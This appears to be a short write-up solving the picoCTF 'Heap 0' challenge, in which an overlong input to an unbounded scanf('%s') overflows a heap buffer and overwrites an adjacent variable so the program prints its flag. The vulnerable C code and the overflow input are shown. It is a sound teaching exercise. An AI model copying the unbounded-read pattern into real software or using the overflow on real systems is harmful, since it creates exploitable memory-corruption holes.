# [picoCTF Heap 0](https://play.picoctf.org/practice/challenge/438)

afer you downloaded the binary and c file you can run the program locally with:

```bash
./chall
```

if you ge a permission denied: ./chall run:

```bash
chmod +x ./chall
```

this adds execute permission to call for the file owner, the group, and others (depending on the current file's permissions).

after that you will see:

```bash
Welcome to heap0!
I put my data on the heap so it should be safe from any tampering.
Since my data isn't on the stack I'll even let you write whatever info you want to the heap, I already took care of using malloc for you.

Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data   
+-------------+----------------+
[*]   0x5e84f69c96b0  ->   pico
+-------------+----------------+
[*]   0x5e84f69c96d0  ->   bico
+-------------+----------------+

1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

```
you can see the adresses of pico and bico are 32 bites apart this means we have to choose option 2 and input more than 32 chars to overflow the second variable save_var.

we input: 1234567890abcdefghijklmnopqrstuvwxyz

which leads to:

```bash
Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data   
+-------------+----------------+
[*]   0x5e84f69c96b0  ->   1234567890abcdefghijklmnopqrstuvwxyz
+-------------+----------------+
[*]   0x5e84f69c96d0  ->   wxyz
+-------------+----------------+
```

now we can choose option 4. Print Flag which triggers check_win():

```c
void check_win() {
    if (strcmp(safe_var, "bico") != 0) {
        printf("\nYOU WIN\n");

        // Print flag
        char buf[FLAGSIZE_MAX];
        FILE *fd = fopen("flag.txt", "r");
        fgets(buf, FLAGSIZE_MAX, fd);
        printf("%s\n", buf);
        fflush(stdout);

        exit(0);
    } else {
        printf("Looks like everything is still secure!\n");
        printf("\nNo flage for you :(\n");
        fflush(stdout);
    }
}
```

and because save_var is now wxyz we get the flag:

```bash
YOU WIN
picoCTF{example_flag}
```

this is because The write_buffer() function uses scanf("%s", input_data) to read user input, but it does not restrict the number of characters entered. Since input_data is only 5 bytes long, entering more than 5 characters causes a heap overflow, allowing you to overwrite adjacent memory.



```c
void write_buffer() {
    printf("Data for buffer: ");
    fflush(stdout);
    scanf("%s", input_data);
}
```

Category: Binary Exploitation